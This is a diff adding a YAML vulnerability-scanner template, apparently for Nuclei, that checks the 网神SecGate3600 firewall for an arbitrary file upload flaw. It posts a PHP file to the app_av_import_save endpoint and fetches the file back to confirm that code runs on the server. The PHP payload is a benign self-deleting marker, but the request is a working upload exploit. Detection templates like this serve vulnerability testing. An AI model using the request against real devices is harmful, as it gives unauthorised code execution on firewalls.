@@ -1,0 +1,63 @@
+id: poc-yaml-wangshen-secgate3600-import-save-arbitrary-file-upload
+
+info:
+  name: 网神SecGate3600防火墙 import_save 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    Arbitrary file upload vulnerability in 网神SecGate3600防火墙 that allows an attacker to upload malicious files, potentially leading to remote code execution.
+
+variables:
+  boundary: '{{rand_text_alphanumeric(10)}}'
+  fname: '{{md5(boundary)}}'
+  v_random_str: '{{rand_text_alphanumeric(5)}}'
+  v_verify_code: '{{md5(v_random_str)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/?g=app_av_import_save'
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}'
+    body: |
+      ------WebKitFormBoundary{{boundary}}
+      Content-Disposition: form-data; name="upfile"; filename="{{fname}}.php"
+      Content-Type: text/plain
+
+      <?php echo md5("{{v_random_str}}");unlink(__FILE__);?>
+
+      ------WebKitFormBoundary{{boundary}}
+      Content-Disposition: form-data; name="submit_post"
+
+      obj_app_upfile
+      ------WebKitFormBoundary{{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "File is valid, and was successfully uploaded."
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/attachements/{{fname}}.php'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{v_verify_code}}'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
